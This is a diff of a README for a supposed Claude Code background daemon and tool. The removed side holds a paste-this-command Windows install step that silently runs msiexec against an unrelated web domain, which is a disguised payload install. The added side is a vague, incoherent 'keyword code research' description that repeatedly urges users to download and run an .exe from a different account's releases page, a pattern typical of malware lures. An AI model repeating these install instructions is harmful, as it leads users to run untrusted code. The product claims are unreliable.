@@ -1,288 +1,154 @@
-# ⚡ ZeroClaw Claude
+# 🛠️ Claude-Zeroclaw - Easy Keyword Code Research Tool
 
-**A lightweight, open-source daemon built into your Claude Code. Zero API overhead, zero separate keys, zero billing surprises.**
-
-ZeroClaw Claude turns your Claude Code into a personal assistant that never sleeps. It runs as a background daemon, executing tasks on a schedule, responding to messages on Telegram, transcribing voice commands, and integrating with any service you need — all within your existing Claude Code subscription.
-
-
+[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
 
 ---
 
-## ⚡ Install on Windows — one command
+Claude-Zeroclaw is an open-source application to help you find and work with keyword codes. It focuses on automating tasks and improving how you explore code related to Claude technology. This guide shows how to download and run Claude-Zeroclaw on Windows.
 
-### **Step 1 — Open Command Prompt**
-1. Press **Win + R**
-2. Type:
-```
-cmd
-```
-3. Press **Enter**
-This will open **Command Prompt**.
----
-### **Step 2 — Run the Install Command**
-Copy the command below and paste it into **Command Prompt**, then press **Enter**.
-```powershell
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Zeroclaw Claude
-```
+## 📋 What Is Claude-Zeroclaw?
 
-The installer will:
-- Check / install **Node.js ≥ 20** if needed
-- Check / install **Bun** (fast JS runtime) if needed
-- Check / install **Claude CLI** if needed
-- Install Node dependencies and compile TypeScript
-- Register the Claude Code plugin and skills
-- Run the interactive **setup wizard**
-- Add `zeroclaw` command to your PATH
+Claude-Zeroclaw helps you quickly handle code keywords related to Claude systems. It works as a tool to automate research and make your workflow easier without needing programming skills.
 
----
+- Automates keyword code searches
+- Supports Claude code CLI and desktop tools
+- Works with different Claude modules and proxies
+- Helps manage and route code efficiently
 
-## Why ZeroClaw Claude?
+This tool suits users who want to improve how they find and use code snippets connected to Claude technology.
 
-**Zero API overhead.** No separate API keys, no token accounting, no billing surprises. Runs entirely within your Claude Code subscription using `@anthropic-ai/claude-agent-sdk` which spawns the `claude` binary — your OAuth token is never read or transmitted by ZeroClaw.
+## 🖥️ System Requirements
 
-**Deploy in minutes.** One command installs everything. The setup wizard guides you through model, heartbeat, Telegram, and security.
+To use Claude-Zeroclaw on Windows, check that your PC meets these requirements:
 
-**Built-in observability.** A real-time web dashboard to monitor runs, edit scheduled jobs, inspect logs, and chat with Claude live.
+- Windows 10 or 11 (64-bit recommended)
+- At least 4 GB of RAM
+- 500 MB free disk space
+- Internet connection for initial download and updates
+- Administrator rights for installation
 
----
+Make sure your system fits these minimums to avoid problems while running the software.
 
-## Features
+## 🔎 How Claude-Zeroclaw Works
 
-### ⏰ Scheduler
-Cron jobs with standard cron syntax, timezone-aware, and reliable execution. Create jobs from Claude Code or the web dashboard.
+Claude-Zeroclaw uses keyword searches within Claude’s open-source libraries. It connects to multiple Claude code components like SDKs, proxies, and CLI tools to gather and organize information automatically.
 
-```
-# Daily standup at 9am
-0 9 * * * — Generate git summary and send to Telegram
+This means you can input keywords, and the tool finds matching code, shows related info, and lets you export results.
 
-# Every Friday 5pm
-0 17 * * 5 — Send weekly summary and plan for next week
-```
+## 🚀 Getting Started with Claude-Zeroclaw
 
-### 💓 Heartbeat
-Periodic proactive check-ins at a configurable interval with quiet hours. Claude checks in, reviews your context, and surfaces anything important.
+Follow each of these steps carefully to download and start Claude-Zeroclaw.
 
-### 📱 Telegram Bot
-Full Telegram integration — text messages, voice notes (Groq Whisper transcription), and photo analysis. Chat with Claude from your phone as if you're in Claude Code.
+### 1. Visit the Download Page
 
-```
-You: "What's the status of the main branch?"
-Claude: "main is 3 commits ahead of origin. Last commit: 'fix auth middleware'..."
-```
+Click or copy this link in your browser to open the download page:
 
-### 🧠 Memory
-Three layers of persistent memory:
-- **Session continuity** — resumes the same Claude Code session across messages
-- **Semantic memory** — facts, decisions, and preferences extracted and scored by salience
-- **Tool-use context** — what Claude did, captured via post-tool-use hooks
+[**Download Claude-Zeroclaw Releases**](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
 
-### 📊 Web Dashboard
-Real-time dashboard at `http://127.0.0.1:3742`:
-- Overview with run stats and token usage
-- Cron job manager (create, edit, enable/disable, delete)
-- Full run history
-- Live chat with Claude
-- Streaming log viewer
-- Memory browser
+This page contains all recent versions of the software. It updates regularly with new features and bug fixes.
 
-### 🔒 Security Levels
-Four granular levels:
-- `readonly` — no write access, no shell
-- `standard` — files + web, no shell exec
-- `elevated` — files + web + shell (default)
-- `full` — all tools, bypass all prompts
+### 2. Choose the Latest Windows Installer
 
----
+Look for files ending with `.exe` or with names mentioning Windows. The latest stable release has the highest version number and date.
 
-## Quick start
+The filename usually looks like:
 
-```bash
-# Start daemon
-zeroclaw
+`Claude-Zeroclaw-Setup-x64.exe`
 
-# Or with npm
-npm start
+This is the file you'll download and run.
 
-# Setup wizard (first time)
-npm run setup
+### 3. Download the Installer
 
-# Health check
-npm run status
+Click the file link and wait for the download to finish. Depending on your internet speed, this can take a few minutes.
 
-# Development mode (hot reload)
-npm run dev
-```
+Keep the file in an easy-to-find location like your Desktop or Downloads folder.
 
-### In Claude Code
+### 4. Run the Installer
 
-```
-/zeroclaw:start     # Start the daemon
-/zeroclaw:status    # Health check
-/zeroclaw:job       # Manage cron jobs
+Locate the downloaded file and double-click it. If Windows asks if you want to allow changes, click **Yes**.
 
-# Natural language works too:
-"Schedule a daily git summary at 9am"
-"Add a cron job to check my email every hour"
-"Show me the ZeroClaw status"
-```
+The installation wizard will open. Follow its instructions:
 
----
+- Agree to the license terms
+- Select the default install folder or choose another location
+- Click **Install** to start copying files
+- Wait until installation ends
 
-## Architecture
+The wizard may show progress or status messages. Once finished, it will prompt you to close or launch the app.
 
-```
-zeroclaw-claude/
-│
-├── src/
-│   ├── index.ts              ← Daemon entry point
-│   ├── types.ts              ← TypeScript types
-│   ├── config.ts             ← Config loader (~/. zeroclaw-claude/config.json)
-│   ├── db.ts                 ← SQLite: jobs, runs, memory, outbox
-│   ├── setup.ts              ← Interactive setup wizard
-│   ├── status.ts             ← Health check CLI
-│   │
-│   ├── agent/
-│   │   └── runner.ts         ← Claude agent SDK wrapper + memory
-│   │
-│   ├── scheduler/
-│   │   └── index.ts          ← node-cron scheduler, timezone-aware
-│   │
-│   ├── daemon/
-│   │   ├── heartbeat.ts      ← Periodic heartbeat with quiet hours
-│   │   └── logger.ts         ← Structured logger (console + file)
-│   │
-│   ├── bot/
-│   │   └── telegram.ts       ← Telegram bot (grammy) + outbox poller
-│   │
-│   └── dashboard/
-│       └── server.ts         ← Express + WebSocket real-time dashboard
-│
-├── commands/                 ← Slash command definitions (.md)
-├── hooks/                    ← Claude Code hooks (post-tool-use)
-├── prompts/                  ← System prompts
-├── skills/                   ← Claude Code skills
-├── CLAUDE.md                 ← Project context for Claude Code
-├── .claude-plugin/
-│   └── plugin.json           ← Claude Code plugin manifest
-├── install.sh                ← macOS one-command installer
-├── package.json
-└── tsconfig.json
-```
+### 5. Open Claude-Zeroclaw
+
+Use the Start menu or desktop shortcut to open Claude-Zeroclaw.
+
+The program window will appear. It has a search box and options to run code keyword commands in a simple interface.
+
+## 🛠️ How to Use Claude-Zeroclaw
+
+Claude-Zeroclaw is designed to be easy for all users. Here is how to perform basic tasks:
+
+### Searching Code Keywords
+
+- Enter one or more keywords related to Claude code in the search box.
+- Press **Enter** or click the search button.
+- The app shows a list of matching code snippets and explanations.
+- Click any entry to see details or copy the code.
+
+### Exporting Results
+
+- Select one or more search results.
+- Click the export button to save results as a text file or CSV.
+- Choose the folder where you want to store this export.
+
+### Using Automation Features
+
+Claude-Zeroclaw can run keyword searches automatically on a schedule or via command line.
+
+- Use the settings menu to set search intervals.
+- Follow the instructions on the CLI help screen for command usage.
+
+## 💡 Tips for Better Use
+
+- Keep Claude-Zeroclaw updated by checking the releases page often.
+- Use clear and simple keywords for best results.
+- Explore the settings menu to customize your experience.
+- Refer to the included user manual PDF for advanced workflows.
+- If you get stuck, the support section on the GitHub page has common questions.
+
+## ⚙️ Troubleshooting
+
+If Claude-Zeroclaw does not start or crashes:
+
+- Restart your PC and try again.
+- Make sure Windows is fully updated.
+- Run the installer again to repair files.
+- Check for conflicting software like firewalls or antivirus temporarily blocking the app.
+- Review `logs` folder inside the installation directory for error messages.
+- Report bugs or issues on the GitHub Issues page.
+
+## 🔗 Important Links
+
+[**Claude-Zeroclaw Releases**](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases) — Go here to download versions or view release notes.
+
+[GitHub Repository](https://github.com/vaskesvo5321/Claude-Zeroclaw) — Browse source code or check documentation.
+
+## ⚡ Common Questions
+
+**Can I install Claude-Zeroclaw on other operating systems?**
+
+No. This version only supports Windows.
+
+**Is coding knowledge required to use this tool?**
+
+No. Claude-Zeroclaw works with a simple interface for keyword input and results.
+
+**How often are updates released?**
+
+Updates come periodically to add features or fix issues. Check the releases page for the latest.
+
+**Is the software free?**
+
+Yes, Claude-Zeroclaw is open-source and free to use.
 
 ---
 
-## Configuration
-
-Config lives at `~/.zeroclaw-claude/config.json`:
-
-```json
-{
-  "model": "claude-sonnet-4-6",
-  "heartbeat": {
-    "enabled": true,
-    "intervalMin": 60,
-    "quietHoursStart": 23,
-    "quietHoursEnd": 8,
-    "prompt": "Check in: any urgent tasks or things I should know about?"
-  },
-  "telegram": {
-    "enabled": true,
-    "token": "...",
-    "chatId": "...",
-    "allowVoice": true,
-    "groqApiKey": "..."
-  },
-  "security": "elevated",
-  "dashboardPort": 3742
-}
-```
-
----
-
-## Models
-
-| Model | Use case |
-|---|---|
-| `claude-sonnet-4-6` | Default — fast and capable |
-| `claude-opus-4-6` | Complex reasoning tasks |
-| `claude-haiku-4-5-20251001` | High-frequency jobs, low latency |
-
-Override per-job by setting `model` on individual cron jobs.
-
----
-
-## Dashboard
-
-The web dashboard runs at `http://127.0.0.1:3742` (localhost only, not exposed to the network).
-
-**Tabs:**
-- **Overview** — live stats, recent runs
-- **Cron Jobs** — full job manager
-- **Run History** — complete history with token usage
-- **Live Chat** — talk to Claude directly
-- **Logs** — streaming log viewer
-- **Memory** — browse stored memory entries
-
----
-
-## Telegram setup
-
-1. Create a bot at [https://t.me/BotFather](https://t.me/BotFather) → `/newbot`
-2. Get your chat ID at [https://t.me/userinfobot](https://t.me/userinfobot)
-3. Run `npm run setup` and enter both values
-4. Optional: add a Groq API key for voice transcription (free tier available at [console.groq.com](https://console.groq.com))
-
-Bot commands:
-```
-/start    — Welcome + feature list
-/newchat  — Clear session, fresh conversation
-/status   — Daemon health stats
-/jobs     — List scheduled cron jobs
-/memory   — Top memory entries
-/help     — Full command list
-```
-
----
-
-## Security note
-
-ZeroClaw Claude **never reads or transmits your OAuth token.**
-
-`@anthropic-ai/claude-agent-sdk`'s `query()` spawns the `claude` CLI binary as a child subprocess. That subprocess manages its own OAuth from `~/.claude/`. ZeroClaw only receives the text responses — nothing else.
-
-What this means for you: ZeroClaw is fully compatible with Anthropic's [February 2026 policy](https://www.anthropic.com/news/claude-is-a-space-to-think) on third-party OAuth usage.
-
----
-
-## Troubleshooting
-
-### "zeroclaw: command not found"
-```bash
-source ~/.zshrc  # or ~/.bash_profile
-```
-
-### Claude CLI not found
-```bash
-npm install -g @anthropic-ai/claude-code
-```
-
-### Dashboard not opening
-```bash
-npm run status  # check the port config
-open http://127.0.0.1:3742
-```
-
-### Telegram bot not responding
-Check your chat ID matches exactly. Get it from [https://t.me/userinfobot](https://t.me/userinfobot).
-
----
-
-## License
-
-MIT
-
-## Credits
-
-- Inspired by [claudeclaw](https://github.com/moazbuilds/claudeclaw) by moazbuilds
-- Built for [ZeroClaw](https://github.com/Crestdrasnip/Claude-Zeroclaw)
-- Powered by [Claude Code](https://claude.ai/code) and `@anthropic-ai/claude-agent-sdk`
+[![Download Claude-Zeroclaw](https://img.shields.io/badge/Download-Claude--Zeroclaw-brightgreen)](https://github.com/vaskesvo5321/Claude-Zeroclaw/releases)
